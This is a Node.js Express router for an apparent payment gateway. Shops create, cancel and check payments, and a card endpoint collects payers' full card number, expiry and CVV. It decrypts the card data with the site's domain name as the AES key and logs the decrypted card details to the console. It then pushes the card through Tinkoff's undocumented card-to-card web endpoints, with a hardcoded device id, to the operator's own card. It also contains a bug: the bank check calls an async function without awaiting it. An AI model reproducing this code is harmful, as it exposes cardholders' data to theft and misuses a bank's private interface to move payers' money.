const vhost = require('vhost');
const express = require("express");
const router = express.Router();
const config = require("../../config");
const paymentsData = require("../../base/payments");
const cardpaysData = require("../../base/cardpays");
const shopsData = require("../../base/shops");
const statsData = require("../../base/stats");
const dates = require("./modules/dates");
const CryptoJS = require("crypto-js");
const request = require('request');
const requests = require('./modules/requests');
const host = config.dashboard.baseURL;
router.post('/api/cdn_reserve', vhost(host, async(req, res) => {
	res.cookie('cdn', 'reserve');
	res.sendStatus(200);
}));
router.post('/api/shop', vhost(host, async(req, res) => {
	const private_key = req.body.private;
	let shopData = await shopsData.findOne({ key_private: private_key });
	if(shopData == null || shopData == undefined) return res.status(404).json({status: 'error', message: 'store not found'});
	res.json({
		balance: shopData.balance,
		id: shopData.id,
		name: shopData.name,
		webhook: shopData.webhook,
	});
}));
router.post('/api/payments', vhost(host, async(req, res) => {
	const public_key = req.body.public;
	const private_key = req.body.private;
	const type = `${req.query.type}`.toLowerCase();
	if(type == 'create'){
		let shopData = await shopsData.findOne({ key_public: public_key });
		const sum = parseInt(req.body.sum);
		if(isNaN(sum) || sum < 1 || sum > 100000) return res.status(400).json({status: 'error', message: 'Payment sum not specified'});
		if(shopData == null || shopData == undefined) return res.status(404).json({status: 'error', message: 'store not found'});
		shopData.payments++;
		await shopData.save();
		let desc = req.body.desc;
		if(desc == undefined || desc == null || desc == '') desc = `Платеж #${shopData.payments}`;
		async function Generate() {
			const code = guid();
			const pay = await paymentsData.findOne({code});
			if(pay == null || pay == undefined) Later(code);
			else Generate();
		}
		async function Later(code) {
			const payData = await new paymentsData({shop:shopData.id, sum, id:shopData.payments, desc, code}).save();
			const statData = await statsData.findOne({shop:shopData.id});
			if(statData != null && statData != undefined){
				statData.total.push(dates.GetStatsDate());
				statData.markModified('total');
				await statData.save();
			}
			res.json({status: 'successfully', payment: payData.code, link: `https://${config.dashboard.baseURL}/pay/${payData.code}`});
		}
		Generate();
	}
	else if(type == 'cancel'){
		let shopData = await shopsData.findOne({ key_private: private_key });
		if(shopData == null || shopData == undefined) return res.status(404).json({status: 'error', message: 'store not found'});
		const code = req.body.payment;
		const pay = await paymentsData.findOne({code, shop:shopData.id});
		if(pay == null || pay == undefined) return res.status(404).json({status: 'error', message: 'payment not found'});
		if(pay.paid) return res.status(400).json({status: 'error', message: 'payment has already been paid'});
		if(pay.canceled) return res.status(400).json({status: 'error', message: 'payment has already been canceled'});
		pay.canceled = true;
		await pay.save();
		const statData = await statsData.findOne({shop:shopData.id});
		if(statData != null && statData != undefined){
			statData.canceled.push(dates.GetStatsDate());
			statData.markModified('canceled');
			await statData.save();
		}
		res.json({status: 'successfully', message: 'payment canceled'});
	}
	else if(type == 'info'){
		let shopData = await shopsData.findOne({ key_private: private_key });
		if(shopData == null || shopData == undefined) return res.status(404).json({status: 'error', message: 'store not found'});
		const code = req.body.payment;
		const pay = await paymentsData.findOne({code, shop:shopData.id});
		if(pay == null || pay == undefined) return res.status(404).json({status: 'error', message: 'payment not found'});
		res.json({desc:pay.desc, shop:pay.shop, sum:pay.sum, method:pay.method, paid:pay.paid, canceled:pay.canceled});
	}
}));
let banks = [];
let commisions = [];
router.post('/api/card', vhost(host, async(req, res) => {
	const type = `${req.query.type}`.toLowerCase();
	if(type == 'commission'){
		if(req.body.data == null || req.body.data == undefined) return res.status(500).json({status: 'error'});
		let card = CryptoJS.AES.decrypt(req.body.data.card, config.dashboard.baseURL).toString(CryptoJS.enc.Latin1);
		if(card == null || card == undefined) return res.status(500).json({status: 'error'});
		card = card.replace(/[^0-9]/g, '');
		if(16 > card.length) return res.status(500).json({status: 'error'});
		if(10 > parseInt(req.body.data.sum)) req.body.data.sum = '10';
		if(req.body.id == 0){
			const cachedCMS = commisions.filter(x => x.card == card);
			if(cachedCMS.length > 0){
				const _val = cachedCMS[0];
				if(0 > _val.value) return res.status(500).json({status: 'error', message:_val.error});
				return res.send(`${_val.value}`);
			}
			const myCard = GetBank(card) == 'Tinkoff Bank' ? config.keys.cards.sber : config.keys.cards.tinkoff;
			const commision = await requestSend('https://api.tinkoff.ru/v1/payment_commission?origin=web%2Cib5%2Cplatform', `payParameters=${JSON.stringify({
				currency: 'RUB',
				moneyAmount: req.body.data.sum,
				provider: 'c2c-anytoany',
				cardNumber: card,
				providerFields: {toCardNumber: myCard}
			})}`);
			if(commision.error || commision.response.statusCode != 200) return res.status(500).json({status: 'error'});
			try{
				const cmsd = JSON.parse(commision.body).payload.total.value;
				commisions.push({card:card, value:cmsd});
				res.send(`${cmsd}`);
			}catch{
				try{
					const jsb = JSON.parse(commision.body);
					if(jsb.errorMessage == null || jsb.errorMessage == undefined) return res.status(500).json({status: 'error'});
					const arrmsgs = jsb.errorMessage.split('-');
					const errMessage = jsb.errorMessage.replace(arrmsgs[0], '').substring(2);
					commisions.push({card:card, value:-1, error:errMessage});
					return res.status(500).json({status: 'error', message:errMessage});
				}
				catch{return res.status(500).json({status: 'error'})}
			}
		}else if(req.body.id == 1){
			return res.status(500).json({status: 'error', message:'Неверно указан ID банка'});
		}
		else return res.status(500).json({status: 'error', message:'Неверно указан ID банка'});
	}else if(type == 'pay'){
		if(req.body.data == null || req.body.data == undefined) return res.status(500).json({status: 'error'});
		const doCard = CryptoJS.AES.decrypt(req.body.data.card, config.dashboard.baseURL+req.body.data.pay).toString(CryptoJS.enc.Latin1);
		console.log(doCard)
		if(doCard == null || doCard == undefined) return res.status(500).json({status: 'error'});
		const cardPayData = await cardpaysData.findOne({id:req.body.data.pay});
		if(cardPayData == null || cardPayData == undefined) return res.status(500).json({status: 'error'});
		let sum = cardPayData.sum;
		if(10 > sum) sum = 10;
		let card = {num:'', date:'', cvv:''};
		try{
			const cj = JSON.parse(doCard);
			if(cj.num == null || cj.num == undefined || cj.num == '' || cj.num.length != 16) return res.status(500).json({status: 'error', message:'Неверно введен номер карты'});
			card.num = cj.num;
			if(cj.date == null || cj.date == undefined || cj.date == '' || cj.date.length != 5) return res.status(500).json({status: 'error', message:'Неверно введена дата истечения карты'});
			card.date = cj.date;
			if(cj.cvv == null || cj.cvv == undefined || cj.cvv == '' || cj.cvv.length != 3) return res.status(500).json({status: 'error', message:'Неверно введен CVV-код карты'});
			card.cvv = cj.cvv;
		}catch{return res.status(500).json({status: 'error', message:'Неверно введены данные карты'})}
		const myCard = GetBank(card.num) == 'Tinkoff Bank' ? config.keys.cards.sber : config.keys.cards.tinkoff;
		const sessionReq = await requestSend('https://www.tinkoff.ru/api/common/v1/session?origin=web%2Cib5%2Cplatform', '');
		if(sessionReq.error || sessionReq.response.statusCode != 200) return res.status(500).json({status: 'error'});
		let session = '';
		try{
			const _sdj = JSON.parse(sessionReq.body);
			if(_sdj.resultCode != 'OK') return res.status(500).json({status: 'error'});
			session = _sdj.payload;
		}catch{return res.status(500).json({status: 'error'})}
		const tdsReq = await requests.Send(`https://www.tinkoff.ru/api/common/v1/check_tds?origin=web%2Cib5%2Cplatform&sessionid=${session}`,
		`cardNumber=${card.num}&currency=RUB&moneyAmount=${sum}&provider=c2c-anytoany&providerFields=${JSON.stringify({toCardNumber: myCard})}`);
		if(tdsReq.error || tdsReq.response.statusCode != 200) return res.status(500).json({status: 'error'});
		let D3S = '';
		try{
			const _sdj = JSON.parse(tdsReq.body);
			if(_sdj.resultCode != 'OK') return res.status(500).json({status: 'error'});
			D3S = _sdj.payload;
		}catch{return res.status(500).json({status: 'error'})}
		const wuid = 'wuid=23549e707cc0a6f4d3fcb7cf3fc8e8d3';
		const payReq = await requests.Send(`https://www.tinkoff.ru/api/common/v1/pay?origin=web%2Cib5%2Cplatform&sessionid=${session}&${wuid}&appName=paymentsc2c&appVersion=2.9.6`, `threeDSecureVersion=${D3S}&payParameters=${JSON.stringify({
			cardNumber: card.num,
			formProcessingTime: card.cvv,
			securityCode: '000',
			expiryDate: card.date,
			attachCard: 'false',
			provider: 'c2c-anytoany',
			currency: 'RUB',
			moneyAmount: sum,
			moneyCommission: sum,
			providerFields: {toCardNumber: myCard}
		})}&delayAccepted=false&userPaymentId=1648036592671&newC2CForm=true&${wuid}&tc=`);
		if(payReq.error || payReq.response.statusCode != 200) return res.status(500).json({status: 'error'});
		let payBody = '';
		try{
			const _sdj = JSON.parse(payReq.body);
			payBody = _sdj;
		}catch{return res.status(500).json({status: 'error'})}
		if(payBody.resultCode != 'WAITING_CONFIRMATION') return res.status(500).json({status: 'error'});
		const _pdata = payBody.confirmationData['3DSecure'];
		cardPayData.verify.tinkoff = {
            session: session,
            ticket: payBody.operationTicket,
            req: _pdata.requestSecretCode
        }
		cardPayData.markModified('verify');
		await cardPayData.save();
		return res.status(200).json({
			status: 'ok',
			url: _pdata.url,
			req: _pdata.requestSecretCode,
			md: _pdata.merchantData,
			//cb: `https://www.tinkoff.ru/cardtocard/3dsecure/end/?paymentId=${_pdata.paymentId}`,
			cb: `${config.dashboard.safe}://${config.dashboard.baseURL}/verifycard?bank=0&pay=${req.body.data.pay}`,
		})
	}
}));
async function GetBank(bin) {
	const cardBIN = bin.substring(0, 6);
	const cachedBins = banks.filter(x => x.card == cardBIN);
	if(cachedBins.length == 0){
		const brand = await requestSend(`https://api.tinkoff.ru/v1/brand_by_bin?origin=web%2Cib5%2Cplatform&bin=${cardBIN}`, '');
		try{
			const _bank = JSON.parse(brand.body).payload.bank;
			banks.push({
				card:cardBIN,
				bank:_bank
			});
			return _bank;
		}catch{return 'Tinkoff Bank'}
	}else{return cachedBins[0].bank;}
}
router.post('/api/ip', vhost(host, async(req, res) => res.json(config.ip)));
module.exports = router;
const guid = function(){return 'xxxxxxxxxxxx4xxxyxxxxxxxxxxxxxxx'.replace(/[xy]/g, function(c) {var r = Math.random()*16|0,v=c=='x'?r:r&0x3|0x8;return v.toString(16);});}
function requestSend(url, form) {
    return new Promise(resolve => request.post({url:url, form:form}, (error, response, body) => resolve({error, response, body})));
}